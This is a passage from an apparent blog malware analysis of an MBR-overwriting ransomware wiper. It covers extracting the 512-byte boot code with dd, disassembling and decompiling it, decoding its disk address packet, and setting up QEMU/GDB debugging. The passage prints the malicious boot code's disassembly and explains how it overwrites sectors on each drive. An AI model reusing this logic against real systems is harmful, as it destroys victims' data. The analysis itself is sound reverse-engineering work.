00003370  20 76 69 61 0d 0a 74 6f  78 20 49 44 20 38 42 45  | via..tox ID 8BE|
00003380  44 43 34 31 31 30 31 32  41 33 33 42 41 33 34 46  |DC411012A33BA34F|
00003390  34 39 31 33 30 44 30 46  31 38 36 39 39 33 43 36  |49130D0F186993C6|
000033a0  41 33 32 44 41 44 38 39  37 36 46 36 41 35 44 38  |A32DAD8976F6A5D8|
000033b0  32 43 31 45 44 32 33 30  35 34 43 30 35 37 45 43  |2C1ED23054C057EC|
000033c0  45 44 35 34 39 36 46 36  35 0d 0a 77 69 74 68 20  |ED5496F65..with |
000033d0  79 6f 75 72 20 6f 72 67  61 6e 69 7a 61 74 69 6f  |your organizatio|
000033e0  6e 20 6e 61 6d 65 2e 0d  0a 57 65 20 77 69 6c 6c  |n name...We will|
000033f0  20 63 6f 6e 74 61 63 74  20 79 6f 75 20 74 6f 20  | contact you to |
00003400  67 69 76 65 20 66 75 72  74 68 65 72 20 69 6e 73  |give further ins|
00003410  74 72 75 63 74 69 6f 6e  73 2e 00 00 00 00 55 aa  |tructions.....U.|
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Note that the final bytes are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;55 aa&lt;/code&gt;, the &lt;a href=&quot;https://medium.com/@shirshakupadhayay182/the-magic-number-0xaa55-in-a-bootloader-e38ebe65bf63&quot;&gt;magic&lt;/a&gt; &lt;a href=&quot;https://www.minuszerodegrees.net/manuals/IBM_5170_Technical_Reference_1502243_MAR84.pdf&quot;&gt;bytes&lt;/a&gt; for MBR boot code. We can also see the ransom note in cleartext. This confirms that bytes 0x3220 - 0x3420 contain the MBR.&lt;/p&gt;

&lt;p&gt;To isolate the boot code, use &lt;em&gt;dd&lt;/em&gt; and extract it to &lt;em&gt;wg.raw&lt;/em&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dd if=wg.exe of=wg-bootcode.raw bs=1 skip=$((0x3220)) count=$((0x200))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At this point, you could apply the boot code to a RAW image and try it out yourself. To &lt;a href=&quot;https://github.com/halcyondream/MBR-Malware-Analysis&quot;&gt;supplement this walkthrough&lt;/a&gt;, I’ve shared a script that will simulate the outcome in QEMU, then dump the results for analysis. You can adjust the parameters to see how hard disks of different sizes are affected after &lt;em&gt;N&lt;/em&gt; seconds (default 5 seconds over 10MB).&lt;/p&gt;

&lt;p&gt;For now, you should convince yourself that malware will corrupt the hard drive. On to static analysis.&lt;/p&gt;

&lt;h1 id=&quot;analyzing-the-malicious-boot-code&quot;&gt;Analyzing the malicious boot code&lt;/h1&gt;

&lt;p&gt;Now we can disassemble only the 16-bit bootcode:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ objdump -D -b binary \
	-mi386 \
	-Maddr16,data16,intel \
	wg-bootcode.raw

wg-bootcode.raw:     file format binary


Disassembly of section .data:

00000000 &amp;lt;.data&amp;gt;:
   0:	eb 00                	jmp    0x2
   2:	8c c8                	mov    ax,cs
   4:	8e d8                	mov    ds,ax
   6:	be 88 7c             	mov    si,0x7c88
   9:	e8 00 00             	call   0xc
   c:	50                   	push   ax
   d:	fc                   	cld
   e:	8a 04                	mov    al,BYTE PTR [si]
  10:	3c 00                	cmp    al,0x0
  12:	74 06                	je     0x1a
  14:	e8 05 00             	call   0x1c
  17:	46                   	inc    si
  18:	eb f4                	jmp    0xe
  1a:	eb 05                	jmp    0x21
  1c:	b4 0e                	mov    ah,0xe
  1e:	cd 10                	int    0x10
  20:	c3                   	ret
  21:	8c c8                	mov    ax,cs
  23:	8e d8                	mov    ds,ax
  25:	a3 78 7c             	mov    ds:0x7c78,ax
  28:	66 c7 06 76 7c 82 7c 	mov    DWORD PTR ds:0x7c76,0x7c82
  2f:	00 00 
  31:	b4 43                	mov    ah,0x43
  33:	b0 00                	mov    al,0x0
  35:	8a 16 87 7c          	mov    dl,BYTE PTR ds:0x7c87
  39:	80 c2 80             	add    dl,0x80
  3c:	be 72 7c             	mov    si,0x7c72
  3f:	cd 13                	int    0x13
  41:	72 02                	jb     0x45
  43:	73 18                	jae    0x5d
  45:	fe 06 87 7c          	inc    BYTE PTR ds:0x7c87
  49:	66 c7 06 7a 7c 01 00 	mov    DWORD PTR ds:0x7c7a,0x1
  50:	00 00 
  52:	66 c7 06 7e 7c 00 00 	mov    DWORD PTR ds:0x7c7e,0x0
  59:	00 00 
  5b:	eb c4                	jmp    0x21
  5d:	66 81 06 7a 7c c7 00 	add    DWORD PTR ds:0x7c7a,0xc7
  64:	00 00 
  66:	66 81 16 7e 7c 00 00 	adc    DWORD PTR ds:0x7c7e,0x0
  6d:	00 00 
  6f:	f8                   	clc
  70:	eb af                	jmp    0x21
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For now, it’s enough to note that the data corruption is a result of calling &lt;a href=&quot;https://en.wikipedia.org/wiki/INT_13H#INT_13h_AH=43h:_Extended_Write_Sectors_to_Drive&quot;&gt;BIOS Interrupt 13h (disk operations) in mode 43h (extended write sectors to drive)&lt;/a&gt;. The parameters for this interrupt:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Registers&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;AH&lt;/td&gt;
      &lt;td&gt;43h = function number for extended write&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;AL&lt;/td&gt;
      &lt;td&gt;bit 0 = 0: close write check, bit 0 = 1: open write check, bit 1-7:reserved, set to 0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DL&lt;/td&gt;
      &lt;td&gt;drive index (e.g. 1st HDD = 80h)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DS:SI&lt;/td&gt;
      &lt;td&gt;segment:offset pointer to the DAP&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;You can refer to the disassembly to see where these parameters are set up and where the call occurs. I’ll refer back to them throughout the rest of this analysis.&lt;/p&gt;

&lt;p&gt;A quick note: the virtual offset here is 0x7c00. This is a requirement for most (if not all) MBR code, as the boot code will load at this address. This is because real-mode boot code is just RAW data, and doesn’t follow a well-defined format like an ELF or PE. Put another way, the entire 512-byte image is treated as the “code section,” which is simply not accurate.&lt;/p&gt;

&lt;p&gt;And &lt;em&gt;that&lt;/em&gt; is important to know because the “data section” in this boot code is also not clearly defined as it would be in an ELF or PE file. That’s why you see statements like:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   2:	8c c8                	mov    ax,cs
   4:	8e d8                	mov    ds,ax
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By storing the value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cs&lt;/code&gt; (code section) into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ds&lt;/code&gt; (data section), the boot code is setting up &lt;em&gt;the entire 512 bytes&lt;/em&gt; as writable data. This allows the boot code to use areas of the image data as data segments and obviates the need for explicit data segments or stack buffers. You can see this, in the usage of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;SIZE&amp;gt; PTR ds:&amp;lt;address&amp;gt;&lt;/code&gt;, in lines like:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  45:	fe 06 87 7c          	inc    BYTE PTR ds:0x7c87
  49:	66 c7 06 7a 7c 01 00 	mov    DWORD PTR ds:0x7c7a,0x1
...
  52:	66 c7 06 7e 7c 00 00 	mov    DWORD PTR ds:0x7c7e,0x0
...
  5d:	66 81 06 7a 7c c7 00 	add    DWORD PTR ds:0x7c7a,0xc7
...
  66:	66 81 16 7e 7c 00 00 	adc    DWORD PTR ds:0x7c7e,0x0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For example, the byte at location 0x87 is used to store the current hard drive index. The actual location here is just after the “AAAAA” string in the data area:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            Disk Index                          As String
--------------------------------v--------------------------- -------v--------
00000080  00 00 41 41 41 41 41 00  59 6f 75 72 20 68 61 72  |..AAAAA.Your har|
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see that the byte which holds the disk index is set to zero (0) initially. For each hard drive detected, this value will increase as the data-corruption routine continues. (Informationally, this also confirms that the malware will start by corrupting data on your primary hard drive.)&lt;/p&gt;

&lt;p&gt;At the cost of using less intuitive code, this approach is rather brilliant given the space limitations of the MBR and its rigid boot-code specification.&lt;/p&gt;

&lt;p&gt;Another note: the entire 512 bytes will disassemble, but anything after location 0x70 is just data, so its disassembly is incorrect. How can we infer that?&lt;/p&gt;

&lt;p&gt;If you look at line 0x3c, you’ll note that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;si&lt;/code&gt; now contains the value at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7c72&lt;/code&gt;, which maps to offset &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x72&lt;/code&gt; in the raw image. This is an argument in the interrupt 0x13 call, so it should point to data, not code. Notice also that no address prior to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7c72&lt;/code&gt; is referenced anywhere in this code for use with data read-write operations.&lt;/p&gt;

&lt;p&gt;We can infer that the boot code ends just before this, at 0x70, whose disassembly establishes that the data-corrupting routine will literally never halt. Anything after 0x70 that is just data meant for read-write purposes. Put another way, the boot code will not attempt to write any data before 0x70, hence the clipped disassembly earlier.&lt;/p&gt;

&lt;p&gt;The MBR boot code displays a message and overwrites hard-drive sectors. I’m more interested in this second behavior, and the rest of the guide will focus exclusively on it. The research discussed earlier provides a good explanation, but we can expand on a few concepts that it left out: decompilation, DAP, and LBA.&lt;/p&gt;

&lt;h1 id=&quot;decompilation&quot;&gt;Decompilation&lt;/h1&gt;

&lt;p&gt;Let’s start with decompilation. Something I found interesting at first was that the author didn’t decompile the MBR code. I tried it myself by hand, and again with Ghidra, and compared the results.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;em&gt;Note: To load the MBR binary into Ghidra, you’ll have to import the RAW file as x86 16-byte Real-Mode. When the disassembly listing loads, right-click the first line, then click &lt;strong&gt;Disassemble&lt;/strong&gt;. This should produce the correct disassembly along with some attempts at decompiled logic.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;MBR code is small, so it’s fairly easy to decompile on your own. My first attempt used a form of pseudocode. The result looked something like this:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;while True, do
    ds = cs
    *((uint16_t *)(ds+0x78)) = cs
    *((uint32_t *)(ds+0x76)) = 0x82
    
    mode = 0x43                                  // Extended write mode
    write_check = 0                              // Disable write verification
    disk_index = *((uint8_t *)(ds+0x87)) + 0x80  // Start at disk 1
    dap_start_addr = 0x72                        // Read from file offset 0x72
    
    error, _ =  interrupt(
                    0x13: interrupt_code, 
                    mode: ah, 
                    write_check: al, 
                    disk_index: dl, 
                    dap_start_addr: si
                )
                
    if error == 1, then
        *((uint8_t *)(ds+0x87)) += 1
        *((uint32_t *)(ds+0x7a)) = 1
        *((uint32_t *)(ds+0x7e)) = 0
    else
        *((uint32_t *)(ds+0x7a)) = 0xc7
        *((uint32_t *)(ds+0x7e)) = cf
    end if
    
done
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Something that makes BIOS interrupts challenging is their lack of mapping to C syntax. This pseudocode uses a syntax like:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;interrupt(code, args...)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;args...&lt;/code&gt; are register names passed in alphabetical order (AH, AL, DL, and SI). But still, there’s no “official” way to express this. In translating this to a high-level language, the “best” approach will likely assume that each register represents a global variable of the same name.&lt;/p&gt;

&lt;p&gt;Many resources on reverse engineering will encourage you to write your own decompilation. The reason why is intuitive (learning moments), but sometimes it is also &lt;em&gt;practical&lt;/em&gt;. To appreciate the practicality, let’s compare it to Ghidra’s decompilation of the same code block:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
void FUN_0000_7c21(void)

{
  char *pcVar1;
  ulong *puVar2;
  long *plVar3;
  ulong uVar4;
  code *pcVar5;
  undefined2 unaff_CS;
  bool bVar6;
  
  do {
    while( true ) {
      *(undefined2 *)0x7c78 = unaff_CS;
      *(char **)0x7c76 = s_AAAAA_0000_7c82;
      bVar6 = 0x7f &amp;lt; *(byte *)((int)s_AAAAA_0000_7c82 + 5);
      pcVar5 = (code *)swi(0x13);
      (*pcVar5)();
      if ((bVar6) || (bVar6)) break;
      puVar2 = (ulong *)0x7c7a;
      uVar4 = *puVar2;
      *puVar2 = *puVar2 + 199;
      plVar3 = (long *)0x7c7e;
      *plVar3 = *plVar3 + (ulong)(0xffffff38 &amp;lt; uVar4);
    }
    pcVar1 = (char *)((int)s_AAAAA_0000_7c82 + 5);
    *pcVar1 = *pcVar1 + &apos;\x01&apos;;
    *(undefined4 *)0x7c7a = 1;
    *(undefined4 *)0x7c7e = 0;
  } while( true );
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Notice that these lines:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      bVar6 = 0x7f &amp;lt; *(byte *)((int)s_AAAAA_0000_7c82 + 5);
      pcVar5 = (code *)swi(0x13);
      (*pcVar5)();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Represent this assembly excerpt:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  35:	8a 16 87 7c          	mov    dl,BYTE PTR ds:0x7c87
  39:	80 c2 80             	add    dl,0x80
  3c:	be 72 7c             	mov    si,0x7c72
  3f:	cd 13                	int    0x13
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this case, the start of the data section (in SI) is not represented at all. It’s also not clear how bVar6, which includes the arguments, is being used (or if it’s used at all). This further complicates the next line:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      if ((bVar6) || (bVar6)) break;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The condition &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(bVar6) || (bVar6)&lt;/code&gt; seems redundant and appears to return a constant result. It appears to never break or always break, depending on the truthiness of the value. This is in sharp contrast to the IF/ELSE behavior, which is a bit more clear in the disassembly:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  41:	72 02                	jb     0x45  ; Error
  43:	73 18                	jae    0x5d  ; Success
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I say “a bit more clear” because the &lt;a href=&quot;https://faydoc.tripod.com/cpu/jb.htm&quot;&gt;JB and JAE mnemonics use the value in CF&lt;/a&gt; to determine where to jump, and that may be less forthcoming than a deliberate IF-ELSE like we use in higher-level languages. (In addition, the JB statement is unnecessary here.) Regardless, you may appreciate why some people still encourage the “hard way” of analyzing disassembled code over blindly trusting decompiled code.&lt;/p&gt;

&lt;h1 id=&quot;disk-address-packet-dap&quot;&gt;Disk Address Packet (DAP)&lt;/h1&gt;

&lt;p&gt;Another area that was briefly touched on in the original analysis was the disk address packet (DAP). This is defined in the &lt;a href=&quot;https://archive.org/details/specs-edd30/page/4/mode/2up?view=theater&quot;&gt;BIOS Enhanced Disk Drive Specification Version 3.0&lt;/a&gt; documentation on page 4.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Offset&lt;/th&gt;
      &lt;th&gt;Type&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;Byte&lt;/td&gt;
      &lt;td&gt;Packet size in bytes. Shall be 16 (10h) or greater. If the packet size is less than 16 the request is rejected with CF=1h and AH=01h. Packet sizes greater than 16 are not rejected, the additional bytes beyond 16 shall be ignored.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;Byte&lt;/td&gt;
      &lt;td&gt;Reserved, must be 0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;Byte&lt;/td&gt;
      &lt;td&gt;Number of blocks to transfer. This field has a maximum value of 127 (7Fh). A block count of 0 means no data is transferred. If a value greater than 127 is supplied the request is rejected with CF=1 and AH=01.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;Byte&lt;/td&gt;
      &lt;td&gt;Reserved, must be 0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;Double word&lt;/td&gt;
      &lt;td&gt;Address of transfer buffer. The is the buffer which Read/Write operations will use to transfer the data. This is a 32-bit address of the form Seg:Offset. If this field is set to FFFF:FFFF then the address of the transfer buffer is found at offset 10h&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8&lt;/td&gt;
      &lt;td&gt;Quad word&lt;/td&gt;
      &lt;td&gt;Starting logical block address, on the target device, of the data to be transferred. This is a 64 bit unsigned linear address. If the device supports LBA addressing this value should be passed unmodified. If the device does not support LBA addressing the following formula holds true when the address is converted to a CHS value (…)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;em&gt;Note: Because we’re working with a 32-bit architecture in mind, I’m omitting the last two rows, which discuss 64-bit quadwords.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This represents 16 bytes (0x10 bytes) of total space. Recall earlier, we observe that the data at 0x7c72 is used for the DAP. We can use the physical offset to get a range&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;0x72 - (0x72 + 0x10) =&amp;gt; 0x72 - 0x82&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Let’s inspect these bytes:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00000070  eb af 10 00 01 00 00 00  00 00 01 00 00 00 00 00  |................|
00000080  00 00 41 41 41 41 41 00  59 6f 75 72 20 68 61 72  |..AAAAA.Your har|
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This gives us a sequence:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;10 00 01 00 00 00  00 00 01 00 00 00 00 00  00 00
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This data structure is read as little endian, so the bytes will reverse. We can map this against the DAP specification:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;File Offset&lt;/th&gt;
      &lt;th style=&quot;text-align: right&quot;&gt;Value&lt;/th&gt;
      &lt;th&gt;Meaning&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;0x72&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Constant 16 (0x10)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;0x73&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Constant 0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;0x74&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x01&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Transfer one block&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;0x75&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Constant 0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;0x76&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00000000&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Transfer buffer offset&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;0x7a&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x0000000000000001&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Start at block one of the LBA&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Recall that, at the beginning of this loop, the value at 0x76 was assigned the address of the ransom note:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  28:	66 c7 06 76 7c 82 7c 	mov    DWORD PTR ds:0x7c76,0x7c82
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So the &lt;em&gt;transfer buffer offset&lt;/em&gt; is really set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00007c82&lt;/code&gt; during runtime.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;em&gt;Note: Earlier, the value at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cs&lt;/code&gt; is moved into the transfer buffer offset’s third byte. The purpose for this is not clear, as the instruction shown at offset 0x28 immediately overwrites it with a DWORD. This is the kind of thing that dynamic analysis will help answer.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The DAP uses these settings on the first invocation of INT 0x13 and on each error. It also resets the target LBA (0x7a - 0x81) to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt; when CF is 1 (indicating an error), when it retrieves the next disk:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  45:	fe 06 87 7c          	inc    BYTE PTR ds:0x7c87
  49:	66 c7 06 7a 7c 01 00 	mov    DWORD PTR ds:0x7c7a,0x1
  50:	00 00 
  52:	66 c7 06 7e 7c 00 00 	mov    DWORD PTR ds:0x7c7e,0x0
  59:	00 00 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If INT 0x13 is successful (CF == 0), the loop stays on the current disk, and iterates by 199 (0xc7) sectors, where it will attempt to overwrite data with the ransom message.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  5d:	66 81 06 7a 7c c7 00 	add    DWORD PTR ds:0x7c7a,0xc7
  64:	00 00 
  66:	66 81 16 7e 7c 00 00 	adc    DWORD PTR ds:0x7c7e,0x0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;What’s interesting to me is on offset 0x66. We could decompile this line as:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;*((uint32_t *)(ds+0x7c7e)) += (0x0 + CF)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, the branch leading to 0x5d is only possible if CF == 0. I don’t see how this adjusts anything about the next LBA. Perhaps dynamic analysis could shed light here.&lt;/p&gt;

&lt;h1 id=&quot;debugging&quot;&gt;Debugging&lt;/h1&gt;

&lt;p&gt;Debugging real-mode code is feasible with QEMU, but there are some limits with the way that newer versions handle it. I found it easier to install Debian 9 in a VM, update using the archive repos, and install its version of QEMU and GDB. It’s a small bit of setup, but it works fine.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ lsb_release -a
No LSB modules are available.
Distributor ID:	Debian
Description:	Debian GNU/Linux 9.7 (stretch)
Release:	    9.7
Codename:	    stretch

$ uname -a
Linux ... 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux

$ qemu-system-x86_64 --version
QEMU emulator version 2.8.1(Debian 1:2.8+dfsg-6+deb9u17)
Copyright (c) 2003-2016 Fabrice Bellard and the QEMU Project developers

$ apt-cache policy gdb qemu-system
gdb:
  Installed: 7.12-6
  Candidate: 7.12-6
  Version table:
 *** 7.12-6 500
        500 http://archive.debian.org/debian stretch/main amd64 Packages
        100 /var/lib/dpkg/status
qemu-system:
  Installed: 1:2.8+dfsg-6+deb9u17
  Candidate: 1:2.8+dfsg-6+deb9u17
  Version table:
 *** 1:2.8+dfsg-6+deb9u17 500
        500 http://archive.debian.org/debian-security stretch/updates/main amd64 Packages
        100 /var/lib/dpkg/status
     1:2.8+dfsg-6+deb9u9 500
        500 http://archive.debian.org/debian stretch/main amd64 Packages
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;Note: Newer versions of QEMU will display inaccurate disassembly. This is annoying and gets in the way of debugging efforts.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;First, run the QEMU system with debug options:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;qemu-system-i386 \
    -drive format=raw,file=disk.raw,index=0 \
    -s -S
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-S&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-s&lt;/code&gt; will launch a debugger on port 1234 and will pause execution so you can attach the debugger.&lt;/p&gt;

&lt;p&gt;We can now use GDB:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gdb \
    -ex &apos;target remote localhost:1234&apos; \
    -ex &apos;set architecture i8086&apos; \
    -ex &apos;break *0x7c00&apos; \
    -ex &apos;continue&apos; \
    -ex &apos;set disassembly-flavor intel&apos; \
    -ex &apos;x/36i $pc&apos; \
